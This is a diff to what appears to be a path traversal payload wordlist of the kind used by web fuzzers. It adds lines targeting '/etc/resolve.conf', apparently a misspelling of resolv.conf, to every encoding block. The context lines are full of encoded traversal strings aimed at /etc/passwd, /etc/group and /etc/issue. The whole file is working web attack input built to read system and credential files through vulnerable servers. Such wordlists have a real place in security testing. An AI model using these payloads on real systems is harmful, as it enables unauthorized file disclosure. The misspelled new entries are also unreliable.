@@ -18,6 +18,9 @@
 ../../../../../../../../../../../../../../../etc%5cpasswd%00
 ../../../../../../../../../../../../../../../etc%c0%afpasswd
 ../../../../../../../../../../../../../../../etc%c0%afpasswd%00
+../../../../../../../../../../../../../../../etc/resolve.conf%00
+../../../../../../../../../../../../../../../etc%2fresolve.conf
+../../../../../../../../../../../../../../../etc%2fresolve.conf%00
 /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd%00
 /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/group%00
 /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/issue%00
@@ -38,6 +41,9 @@
 /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%5cpasswd%00
 /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%c0%afpasswd
 /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%c0%afpasswd%00
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/resolve.conf%00
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fresolve.conf
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fresolve.conf%00
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/group%00
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/issue%00
@@ -58,6 +64,9 @@
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc%5cpasswd%00
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc%c0%afpasswd
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc%c0%afpasswd%00
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/resolve.conf%00
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc%2fresolve.conf
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc%2fresolve.conf%00
 /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%00
 /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/group%00
 /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/issue%00
@@ -78,6 +87,9 @@
 /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%5cpasswd%00
 /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%c0%afpasswd
 /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%c0%afpasswd%00
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/resolve.conf%00
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fresolve.conf
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fresolve.conf%00
 /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd%00
 /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/group%00
 /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/issue%00
@@ -98,6 +110,9 @@
 /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%5cpasswd%00
 /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%c0%afpasswd
 /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%c0%afpasswd%00
+/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/resolve.conf%00
+/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%2fresolve.conf
+/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%2fresolve.conf%00
 /%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd%00
 /%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/group%00
 /%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/issue%00
@@ -118,6 +133,9 @@
 /%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc%5cpasswd%00
 /%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc%c0%afpasswd
 /%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc%c0%afpasswd%00
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/resolve.conf%00
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc%2fresolve.conf
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc%2fresolve.conf%00
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd%00
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/group%00
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/issue%00
@@ -138,6 +156,9 @@
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%5cpasswd%00
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%c0%afpasswd
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%c0%afpasswd%00
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/resolve.conf%00
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%2fresolve.conf
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%2fresolve.conf%00
 /..\..\..\..\..\..\..\..\etc/passwd%00
 /..\..\..\..\..\..\..\..\etc/group%00
 /..\..\..\..\..\..\..\..\etc/issue%00
@@ -158,6 +179,9 @@
 /..\..\..\..\..\..\..\..\etc%5cpasswd%00
 /..\..\..\..\..\..\..\..\etc%c0%afpasswd
 /..\..\..\..\..\..\..\..\etc%c0%afpasswd%00
+/..\..\..\..\..\..\..\..\etc/resolve.conf%00
+/..\..\..\..\..\..\..\..\etc%2fresolve.conf
+/..\..\..\..\..\..\..\..\etc%2fresolve.conf%00
 /..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc/passwd%00
 /..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc/group%00
 /..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc/issue%00
@@ -178,6 +202,9 @@
 /..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%5cpasswd%00
 /..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%c0%afpasswd
 /..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%c0%afpasswd%00
+/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc/resolve.conf%00
+/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%2fresolve.conf
+/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%2fresolve.conf%00
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd%00
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/group%00
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/issue%00
@@ -198,6 +225,9 @@
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd%00
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%c0%afpasswd
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%c0%afpasswd%00
+/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/resolve.conf%00
+/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%2fresolve.conf
+/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%2fresolve.conf%00
 /%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc/passwd%00
 /%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc/group%00
 /%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc/issue%00
@@ -218,6 +248,9 @@
 /%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc%5cpasswd%00
 /%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc%c0%afpasswd
 /%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc%c0%afpasswd%00
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc/resolve.conf%00
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc%2fresolve.conf
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc%2fresolve.conf%00
 /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd%00
 /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/group%00
 /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/issue%00
@@ -238,6 +271,9 @@
 /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd%00
 /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%c0%afpasswd
 /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%c0%afpasswd%00
+/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/resolve.conf%00
+/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%2fresolve.conf
+/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%2fresolve.conf%00
 /%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\etc/passwd%00
 /%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\etc/group%00
 /%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\etc/issue%00
@@ -258,6 +294,9 @@
 /%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\etc%5cpasswd%00
 /%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\etc%c0%afpasswd
 /%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\etc%c0%afpasswd%00
+/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\etc/resolve.conf%00
+/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\etc%2fresolve.conf
+/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\etc%2fresolve.conf%00
 /..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd%00
 /..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/group%00
 /..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/issue%00
@@ -278,6 +317,9 @@
 /..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%5cpasswd%00
 /..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
 /..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd%00
+/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/resolve.conf%00
+/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%2fresolve.conf
+/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%2fresolve.conf%00
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/group%00
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/issue%00
@@ -298,6 +340,9 @@
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc%5cpasswd%00
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc%c0%afpasswd
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc%c0%afpasswd%00
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/resolve.conf%00
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc%2fresolve.conf
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc%2fresolve.conf%00
 /../../../../../../../../etc/passwd%00
 /../../../../../../../../etc/group%00
 /../../../../../../../../etc/issue%00
@@ -318,6 +363,9 @@
 /../../../../../../../../etc%5cpasswd%00
 /../../../../../../../../etc%c0%afpasswd
 /../../../../../../../../etc%c0%afpasswd%00
+/../../../../../../../../etc/resolve.conf%00
+/../../../../../../../../etc%2fresolve.conf
+/../../../../../../../../etc%2fresolve.conf%00
 /.../.../.../.../.../.../.../.../etc/passwd%00
 /.../.../.../.../.../.../.../.../etc/group%00
 /.../.../.../.../.../.../.../.../etc/issue%00
@@ -338,6 +386,9 @@
 /.../.../.../.../.../.../.../.../etc%5cpasswd%00
 /.../.../.../.../.../.../.../.../etc%c0%afpasswd
 /.../.../.../.../.../.../.../.../etc%c0%afpasswd%00
+/.../.../.../.../.../.../.../.../etc/resolve.conf%00
+/.../.../.../.../.../.../.../.../etc%2fresolve.conf
+/.../.../.../.../.../.../.../.../etc%2fresolve.conf%00
 /...\...\...\...\...\...\...\...\etc/passwd%00
 /...\...\...\...\...\...\...\...\etc/group%00
 /...\...\...\...\...\...\...\...\etc/issue%00
@@ -358,6 +409,9 @@
 /...\...\...\...\...\...\...\...\etc%5cpasswd%00
 /...\...\...\...\...\...\...\...\etc%c0%afpasswd
 /...\...\...\...\...\...\...\...\etc%c0%afpasswd%00
+/...\...\...\...\...\...\...\...\etc/resolve.conf%00
+/...\...\...\...\...\...\...\...\etc%2fresolve.conf
+/...\...\...\...\...\...\...\...\etc%2fresolve.conf%00
 /..../..../..../..../..../..../..../..../etc/passwd%00
 /..../..../..../..../..../..../..../..../etc/group%00
 /..../..../..../..../..../..../..../..../etc/issue%00
@@ -378,6 +432,9 @@
 /..../..../..../..../..../..../..../..../etc%5cpasswd%00
 /..../..../..../..../..../..../..../..../etc%c0%afpasswd
 /..../..../..../..../..../..../..../..../etc%c0%afpasswd%00
+/..../..../..../..../..../..../..../..../etc/resolve.conf%00
+/..../..../..../..../..../..../..../..../etc%2fresolve.conf
+/..../..../..../..../..../..../..../..../etc%2fresolve.conf%00
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd%00
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/group%00
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/issue%00
@@ -398,6 +455,9 @@
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc%5cpasswd%00
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc%c0%afpasswd
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc%c0%afpasswd%00
+/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/resolve.conf%00
+/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc%2fresolve.conf
+/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc%2fresolve.conf%00
 /..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc/passwd%00
 /..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc/group%00
 /..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc/issue%00
@@ -418,6 +478,9 @@
 /..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%5cpasswd%00
 /..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%c0%afpasswd
 /..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%c0%afpasswd%00
+/..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc/resolve.conf%00
+/..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%2fresolve.conf
+/..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%2fresolve.conf%00
 /..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc/passwd%00
 /..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc/group%00
 /..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc/issue%00
@@ -438,6 +501,9 @@
 /..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc%5cpasswd%00
 /..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc%c0%afpasswd
 /..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc%c0%afpasswd%00
+/..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc/resolve.conf%00
+/..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc%2fresolve.conf
+/..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc%2fresolve.conf%00
 /..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025etc/passwd%00
 /..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025etc/group%00
 /..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025etc/issue%00
@@ -458,6 +524,9 @@
 /..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025etc%5cpasswd%00
 /..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025etc%c0%afpasswd
 /..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025etc%c0%afpasswd%00
+/..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025etc/resolve.conf%00
+/..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025etc%2fresolve.conf
+/..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025etc%2fresolve.conf%00
 /..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc/passwd%00
 /..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc/group%00
 /..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc/issue%00
@@ -478,6 +547,9 @@
 /..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc%5cpasswd%00
 /..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc%c0%afpasswd
 /..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc%c0%afpasswd%00
+/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc/resolve.conf%00
+/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc%2fresolve.conf
+/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc%2fresolve.conf%00
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc/passwd%00
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc/group%00
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc/issue%00
@@ -498,6 +570,9 @@
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc%5cpasswd%00
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc%c0%afpasswd
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc%c0%afpasswd%00
+/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc/resolve.conf%00
+/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc%2fresolve.conf
+/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc%2fresolve.conf%00
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc/passwd%00
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc/group%00
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc/issue%00
@@ -518,6 +593,9 @@
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc%5cpasswd%00
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc%c0%afpasswd
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc%c0%afpasswd%00
+/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc/resolve.conf%00
+/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc%2fresolve.conf
+/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc%2fresolve.conf%00
 /..//..//..//..//..//..//etc/passwd%00
 /..//..//..//..//..//..//etc/group%00
 /..//..//..//..//..//..//etc/issue%00
@@ -538,3 +616,6 @@
 /..//..//..//..//..//..//etc%5cpasswd%00
 /..//..//..//..//..//..//etc%c0%afpasswd
 /..//..//..//..//..//..//etc%c0%afpasswd%00
+/..//..//..//..//..//..//etc/resolve.conf%00
+/..//..//..//..//..//..//etc%2fresolve.conf
+/..//..//..//..//..//..//etc%2fresolve.conf%00
